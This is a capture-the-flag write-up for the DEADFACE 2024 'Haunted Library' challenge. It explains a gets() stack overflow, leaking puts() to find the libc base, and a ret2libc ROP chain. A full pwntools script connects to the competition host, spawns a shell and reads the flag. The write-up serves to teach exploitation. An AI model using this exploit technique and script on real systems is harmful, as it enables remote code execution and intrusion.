# DEADFACE CTF 2024 - Haunted Library Writeup



## Challenge Description

A mysterious library system awaits... Can you uncover its secrets?

**Connection Details:**
```bash
nc env02.deadface.io 7832
```

**Files Provided:**
- `hauntedlibrary` - The vulnerable binary
- `libc.so.6` - The libc library
- `ld-linux-x86-64.so.2` - The dynamic linker




First we should actually run checksec to see 

```bash
$ checksec hauntedlibrary
[*] 'hauntedlibrary'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
```

Mhmm so  , some stuff to note from checksec is 
-  **No Stack Canary** - Stack buffer overflows are exploitable
-  **NX Enabled** - We can't execute shellcode on the stack (need ROP)
-  **No PIE** - Binary addresses are predictable/static
-  **Partial RELRO** - GOT is writable, but we'll use ROP instead
-  **Not Stripped** - Function names are available for analysis

Enough static and lets try running the binary 

```bash
$ ./hauntedlibrary

░░░░░░░░░░░░░░░░░░▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
Welcome to the Haunted Library...
 where every book has a story to tell, and some secrets are better left unread.

1. Browse available books
2. Check out a book
3. Exit

> 
```


It has a menu system where you can browse books , check out book and exit  



Since we have the static stuff out of the way , lets see thew pesudo code in ghidra and  

Loading the binary into Ghidra, we identify several key functions:

#### Main Fun

```c
void main(void) {
    int choice;
    
    setup();
    banner();
    
    while (true) {
        menu();
        scanf("%d", &choice);
        
        switch(choice) {
            case 1:
                browse_books();
                break;
            case 2:
                check_out();
                break;
            case 3:
                exit(0);
            default:
                puts("Invalid choice!");
        }
    }
}
```



The `check_out()` function at `0x4013e7` contains our vulnerability:

```c
void check_out(void) {
    char book_name[80];  // 80-byte buffer
    
    puts("Which book would you like to check out?");
    printf("> ");
    gets(book_name);  //  ! No bounds checking! ehee 
    
    if (strcmp(book_name, "BookOfTheDead") == 0) {
        book_of_the_dead();
    } else {
        printf("You could have sworn you saw a book called '%s'...\n", book_name);
        puts(" but as you look closer, it was nowhere to be found.");
    }
}
```

 The `gets()` function reads unlimited input into an 80-byte buffer, allowing a classic stack overflow  

Also an another thing i found in ghidra was  

`book_of_the_dead()` at `0x40174f`:

```c
void book_of_the_dead(void) {
    long puts_addr = (long)&puts;
    printf("puts(): 0x%lx\n", puts_addr);
}
```

Oh we get the puts from libc , so we can bypass ASLR and contruct a rop chain and we can also get the libc base and get values of other functions , like system for example .



So far my thought process is to - Overflow the buffer to call a leak stage (e.g. `puts(puts@got)` or `book_of_the_dead()`), return to `main`, parse the leaked `puts` to compute `libc_base`, find `system` and `"/bin/sh"` offsets, then send a second ROP payload using `pop rdi; ret` to call `system("/bin/sh")` and spawn a shell to read the flag.




Using pwntools' `cyclic` pattern to find the exact offset to the return address:

```python
from pwn import *

p = process('./hauntedlibrary')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', cyclic(200))
```

Running in GDB:
```bash
$ gdb ./hauntedlibrary
gdb> run
# ... crash ...
gdb> x/wx $rsp
0x6161616c  # "laaa" in cyclic pattern
```

```python
>>> from pwn import cyclic_find
>>> cyclic_find(0x6161616c)
88
```

**The return address is at offset 88 bytes!**

ALr now leats leak the libc 

```python
from pwn import *

# Addresses
BOOK_OF_THE_DEAD = 0x40174f
MAIN = 0x401226

# Connect
p = remote('env02.deadface.io', 7832)

# Navigate to check_out
p.recvuntil(b'> ')
p.sendline(b'2')
p.recvuntil(b'> ')

# Overflow to call book_of_the_dead, then return to main
payload1 = flat([
    b'A' * 88,          # Fill buffer up to return address
    BOOK_OF_THE_DEAD,   # Call book_of_the_dead()
    MAIN                # Return to main() for round 2
])

p.sendline(payload1)

# Parse the leak
p.recvuntil(b'puts(): ')
leak_line = p.recvline().decode()
match = re.search(r'(0x[0-9a-fA-F]+)', leak_line)
leak = int(match.group(1), 16)
```

LIBC base would be 

```python
libc = ELF('./libc.so.6')

# Calculate base address
libc.address = leak - libc.symbols['puts']

print(f"[+] Leaked puts(): {hex(leak)}")
print(f"[+] Libc base: {hex(libc.address)}")
```


Before building our ROP chain, ill try to explain what rop gadgets we need etc and why and where to use them . 




In **x86-64 (64-bit) Linux**, function arguments are passed through **registers** in this specific order:

| Argument | Register |
|----------|----------|
| 1st      | **RDI**  |
| 2nd      | RSI      |
| 3rd      | RDX      |
| 4th      | RCX      |
| 5th      | R8       |
| 6th      | R9       |
| 7th+     | Stack    |

Our goal is to call:
```c
int system(const char *command);
//         ^^^^^^^^^^^^^^^^^^
//         First argument → Must be in RDI!
```

We want: `system("/bin/sh")`

So we need to load the address of the string `"/bin/sh"` into **RDI** before calling `system()`. :)




We need two gadgets:

1. **`pop rdi; ret`** - Pops a value from the stack into RDI
   ```asm
   pop rdi    ; RDI = [stack pointer], then SP += 8
   ret        ; RIP = [stack pointer], then SP += 8
   ```

2. **`ret`** - Just returns (used for stack alignment)
   ```asm
   ret        ; RIP = [stack pointer], then SP += 8
   ```

Lets find using ropgadget tool 

```python
# Using ROPgadget or ropper
$ ROPgadget --binary libc.so.6 | grep "pop rdi"
0x00000000000102dea : pop rdi ; ret

$ ROPgadget --binary libc.so.6 | grep ": ret$"
0x0000000000024578 : ret
```

```python
pop_rdi = libc.address + 0x102dea
ret_gadget = libc.address + 0x24578
```


now thats done lets build a rop chain 

```python
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))

payload2 = flat([
    b'A' * 88,      # Fill buffer to return address
    ret_gadget,     # Stack alignment (system needs 16-byte aligned stack)
    pop_rdi,        # Pop next value into RDI
    binsh,          # Address of "/bin/sh" string
    system          # Call system("/bin/sh")
])
```




Modern libc functions (especially `system()`) expect the stack to be **16-byte aligned**. The extra `ret` gadget ensures proper alignment, preventing crashes.

Without alignment:
```
Stack pointer: 0x7fffffffe3d8  ← Not 16-byte aligned
system() crashes with SIGSEGV
```

With alignment:
```
ret gadget pops once → Stack pointer: 0x7fffffffe3e0  ← 16-byte aligned!
system() executes successfully
```



## Final pwn code :)

```python
from pwn import *
import re

# Load binaries
exe = ELF('./hauntedlibrary_patched')
libc = ELF('./libc.so.6')

context.binary = exe
context.log_level = 'info'

print("="*60)
print("DEADFACE CTF - Haunted Library Exploit")
print("="*60)

# Stage 1: Get libc leak
print("\n[*] Stage 1: Getting libc leak...")
p = remote('env02.deadface.io', 7832)

p.recvuntil(b'> ')
p.sendline(b'2')  # Check out
p.recvuntil(b'> ')

# Overflow to call book_of_the_dead, then return to main
payload1 = b'A' * 88 + p64(0x40174f) + p64(0x401226)
p.sendline(payload1)

# Parse the leaked address
p.recvuntil(b'nowhere to be found')
p.recvuntil(b'puts(): ')
leak_line = p.recvline().decode()

# Extract hex address (ignore Unicode garbage)
match = re.search(r'(0x[0-9a-fA-F]+)', leak_line)
leak = int(match.group(1), 16)

# Calculate libc base
libc.address = leak - libc.symbols['puts']

# Find what we need
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
pop_rdi = libc.address + 0x102dea
ret_gadget = libc.address + 0x24578

print(f"[+] Leaked puts(): {hex(leak)}")
print(f"[+] Libc base: {hex(libc.address)}")
print(f"[+] system(): {hex(system)}")
print(f"[+] /bin/sh: {hex(binsh)}")
print(f"[+] pop rdi: {hex(pop_rdi)}")

# Stage 2: Get shell
print("\n[*] Stage 2: Getting shell...")

p.recvuntil(b'> ')
p.sendline(b'2')  # Check out again
p.recvuntil(b'> ')

# ROP chain to call system("/bin/sh")
payload2 = flat([
    b'A' * 88,
    ret_gadget,    # Stack alignment
    pop_rdi,       # Pop next value into RDI
    binsh,         # "/bin/sh" address
    system         # system() address
])

p.sendline(payload2)
sleep(1)

# Get the flag
print("[*] Reading flag...")
p.sendline(b'cat BookOfTheDead.txt')

output = p.recvall(timeout=3)

print("\n" + "="*60)
print("FLAG:")
print("="*60)
print(output.decode())
print("="*60)
```





```bash
$ python exploit.py
============================================================
DEADFACE CTF - Haunted Library Exploit
============================================================

[*] Stage 1: Getting libc leak...
[+] Opening connection to env02.deadface.io on port 7832: Done
[+] Leaked puts(): 0x7dd673e9bc80
[+] Libc base: 0x7dd673e19000
[+] system(): 0x7dd673e6cb00
[+] /bin/sh: 0x7dd673fc9ebc
[+] pop rdi: 0x7dd673f1bdea

[*] Stage 2: Getting shell...
[*] Reading flag...
[+] Receiving all data: Done

============================================================
FLAG:
============================================================
deadface{TH3_L1BR4RY_KN0W5_4LL}
============================================================
```




